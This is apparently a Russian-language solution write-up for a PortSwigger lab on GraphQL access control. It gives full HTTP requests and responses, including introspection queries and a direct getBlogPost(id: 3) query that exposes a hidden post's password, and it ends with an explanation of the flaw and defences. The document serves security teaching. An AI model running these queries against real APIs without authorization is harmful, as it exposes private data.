
лаба https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

задание: 
Страница блога этой лабораторной содержит скрытую запись в блоге с секретным паролем. 
Чтобы решить задачу, найдите скрытую запись в блоге и введите пароль

-----

вот запрос

```json
POST /graphql/v1 HTTP/2
Host: 0a4900ef032e2ef6821dfd6d007700dc.web-security-academy.net
Cookie: session=L19nInu81khhB2UnGBOCG0GzQ9rZVogF
Content-Length: 165
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Accept: application/json
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Origin: https://0a4900ef032e2ef6821dfd6d007700dc.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4900ef032e2ef6821dfd6d007700dc.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"query":"\nquery getBlogSummaries {\n    getAllBlogPosts {\n        image\n        title\n        summary\n        id\n    }\n}","operationName":"getBlogSummaries"}
```

вот ответ
```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 1343

{
  "data": {
    "getAllBlogPosts": [
      {
        "image": "/image/blog/posts/38.jpg",
        "title": "Don't Believe Everything You Read",
        "summary": "Don't believe everything you read is not only a common expression, it's also a pretty obvious one. Although, it's common and obvious because it's an old saying, an old saying rooted in print journalism and their individual biases. But now,...",
        "id": 1
      },
      {
        "image": "/image/blog/posts/13.jpg",
        "title": "Lies, Lies & More Lies",
        "summary": "I remember the first time I told a lie. That's not to say I didn't do it before then, I just don't remember. I was nine years old and at my third school already. Fitting into already established friendship groups...",
        "id": 2
      },
      {
        "image": "/image/blog/posts/20.jpg",
        "title": "The Digital Fairytale",
        "summary": "Once upon a time'",
        "id": 5
      },
      {
        "image": "/image/blog/posts/69.jpg",
        "title": "What Can 5G Do For You?",
        "summary": "In a world where virtual reality has become the new reality, nothing is impossible. Household appliances are becoming robots in their own right. We were treated to an advance viewing of How Your Home Can Work For You; forget smart...",
        "id": 4
      }
    ]
  }
}
```
есть запросы 1 - 2 - 4 - 5 нет 3 поста

----------


спросил несуществующие энпоинты
```json
{"query": "{ product(id: 3) { id, name, listed } }"}

---------

ответ

{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 3
        }
      ],
      "message": "Validation error (FieldUndefined@[product]) : Field 'product' in type 'query' is undefined"
    }
  ]
}
```
 уже хорошо, это точно graphql и он отвечает мне

---


запрос
```json
{"query": "{__schema\n{queryType{name}}}"}


ответ 200

{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}

```

-------


запрос
```json

{"query":"{ __schema { types { name fields { name } } } }"}


ответ 200

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4231

{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "BlogPost",
          "fields": [
            {
              "name": "id"
            },
            {
              "name": "image"
            },
            {
              "name": "title"
            },
            {
              "name": "author"
            },
            {
              "name": "date"
            },
            {
              "name": "summary"
            },
            {
              "name": "paragraphs"
            },
            {
              "name": "isPrivate"
            },
            {
              "name": "postPassword"
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "Timestamp",
          "fields": null
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isRepeatable"
            },
            {
              "name": "locations"
            },
            {
              "name": "args"
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "args"
            },
            {
              "name": "type"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "type"
            },
            {
              "name": "defaultValue"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description"
            },
            {
              "name": "types"
            },
            {
              "name": "queryType"
            },
            {
              "name": "mutationType"
            },
            {
              "name": "directives"
            },
            {
              "name": "subscriptionType"
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind"
            },
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "fields"
            },
            {
              "name": "interfaces"
            },
            {
              "name": "possibleTypes"
            },
            {
              "name": "enumValues"
            },
            {
              "name": "inputFields"
            },
            {
              "name": "ofType"
            },
            {
              "name": "specifiedByURL"
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getBlogPost"
            },
            {
              "name": "getAllBlogPosts"
            }
          ]
        }
      ]
    }
  }
}

```

вижу что в BlogPost есть поле  postPassword

и есть методы для  query = getBlogPost и  getAllBlogPosts
```json
       {
          "name": "query",
          "fields": [
            {
              "name": "getBlogPost"
            },
            {
              "name": "getAllBlogPosts"
            }
          ]
        }
```

нужно postPassword достать теперь

пытаюсь его достать
```json
запрос

{"query":"{ getBlogPost { postPassword } }"}  // ошибка
{"query":"{ getBlogPost(id: 1) { postPassword } }"} // пусто
{"query":"{ getBlogPost(id: 3) { postPassword } }"} // ответ      "postPassword": "vy9ho02b2o19fe3sn3vl4q0ygmhpsecl"

ответ на id: 3


{
  "data": {
    "getBlogPost": {
      "postPassword": "vy9ho02b2o19fe3sn3vl4q0ygmhpsecl"
    }
  }
}

```
----




#### почему получилось взломать  
из-за отсутствия проверки прав доступа на уровне отдельных полей graphql в списке всех постов сервер вернул только публичные id 1 2 4 5 

но при этом метод getblogpost позволял напрямую обратиться к любому посту по id включая скрытый id 3^ , разработчики забыли что единый endpoint требует защиты на каждом поле и аргументе вдобавок introspection был включен что позволило узнать о существовании поля postpassword

#### как взломал

заметил что в ответе на getallblogposts не хватает id 3 это явный признак скрытого объекта 

затем через introspection запрос` { _ _schema { types { name fields { name } } } }` выяснил структуру и в типе blogpost нашлел поле postpassword,
далее в корневом типе query обнаружил метод getblogpost который принимает аргумент id 
после этого отправил прямой запрос к скрытому посту { getblogpost(id: 3) { postpassword } } и получил пароль

#### как защититься  

отключить introspection в продакшене чтобы злоумышленник не мог узнать структуру api

всегда проверять авторизацию на уровне каждого поля и каждого аргумента нельзя доверять что клиент запросит только разрешенные данные даже если объект скрыт в списке он должен быть недоступен и по прямому id использовать сложные неинкрементные id для объектов чтобы их нельзя было перебрать и внедрить проверки на уровне бизнес-логики которые запрещают доступ к скрытым объектам независимо от способа запроса


